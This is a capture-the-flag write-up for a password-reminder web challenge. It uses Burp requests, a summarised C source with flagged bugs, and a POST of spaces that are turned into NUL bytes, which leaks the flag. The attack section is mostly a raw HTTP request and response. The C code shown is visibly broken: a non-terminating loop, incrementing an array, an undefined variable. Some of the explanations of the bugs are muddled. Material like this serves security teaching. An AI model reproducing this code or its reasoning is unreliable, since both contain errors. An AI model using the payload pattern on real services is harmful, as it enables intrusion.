# WriteUP for the "GiveMeThaPassword" Challenge

## Recon
At first we receive a link to the challenge. 

Inspect it and we receive a blank page. Umm smells like we are going to use burp.

Use Burp proxy to inspect the GET request.

When we try to make the GET we receive a 400 Bad Request.

Since we don't have any more info, let's change to POST Request.

We do the POST and receive this:

```tcp
HTTP/1.1 200 OK
Content-Length: 41
Content-Type: text/plain; charset=utf-8
Date: Tue, 08 Dec 2020 12:46:26 GMT
Connection: close

Passwords must be at least 8 characters! 
```

Nice! :)

Sending a password with 8 characters:

```tcp
HTTP/1.1 200 OK
Content-Length: 64
Content-Type: text/plain; charset=utf-8
Date: Tue, 08 Dec 2020 12:48:49 GMT
Connection: close

Looks like you forgot your password! Your password is: AAAAAAAA
```

OK, now we know how the requets are working, let's check the code.

We can summarize the code in this lines

```c
void ctf(char *password, int print) {
	char buffer[256];
	int pwdlen = strlen(password);

	if (strlen(password) < 8) {
		printf("Passwords must be at least 8 characters!\n");
		return;
	}
	// passwords are case-insensitive
	//uppercase
	while (password) {
		//WARNING 1!
		*password &= ~0x20; //*password = *password & ~0x20; to uppercase
		password++;
	}
	//cpy
	while (*password) {
    //WARNING 2!
		*buffer = *password;
		buffer++;
		password++;
	}
	//email
	if (print){
		printf("Looks like you forgot your password! Your password is: ");
		for (int i = 0; i < n; i++) {
			printf("%c", password[i]);
		}
		printf("\n");
	}
	// Erase sensitive information!!
  	//WARNING 3!
	memset(buffer, ' ', 256);
}

int main(int argc, char *argv[]) {
	while (--argc) {
		char buffer[256] = {0};
		strcpy(buffer, argv[argc]);
		ctf(&buffer[0], argc == 1);
	}

	return 0;
}
```
As you can see in the code, I added 3 warnings, let's check it to see how we can retrive the password.

## Warning 1
```c
*password &= ~0x20;
```
This part makes the AND operation in the sixth bit so:

If we have an 'a' and we want to change to 'A' we do this:

```
a 		=	0110 0001
~0x20	=	1101 1111
    	 	---------
A 		=	0100 0001    
```
This type of bit manipulation is also pretty dangerous, mostly because of we can send NULL 
signals use a SPACE character:

```
' '		=	0010 0000
~0x20	=	1101 1111
    	 	---------
NULL	=	0000 0000    
```
Note for the future: "Send whitespaces, maybe i'll find something"

## Warning 2
```c
while (*password) {
*buffer = *password;
		buffer++;
		password++;
	}
```
This is another example of NOT to copy a variable, with this type of code I can write outside
the buffer (buffer overflow) and access other parts of the memory or even manipulate
the flow of the program; sending NULL signal for example, because the while will never
be true.

## Warning 3
```c
memset(buffer, ' ', 256);
```
This function is being optimized by the compiler, and it's not running. ¯\_(ツ)_/¯


## Exploit
With everything that we learned before we can clearly send this NULL signals and watch the
behaviour of the app.

```tcp
POST /password/remind HTTP/1.1
Host: xxx.es
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

                                                      
```   
Response:                                                
```tcp
HTTP/1.1 200 OK
Content-Length: 110
Content-Type: application/octet-stream
Date: Sun, 27 Dec 2020 19:51:19 GMT
Connection: close

Looks like you forgot your password! Your password is: FLAG[INSOVIETRUSSIAFLAGCAPTURESU]
``` 

That's all folks!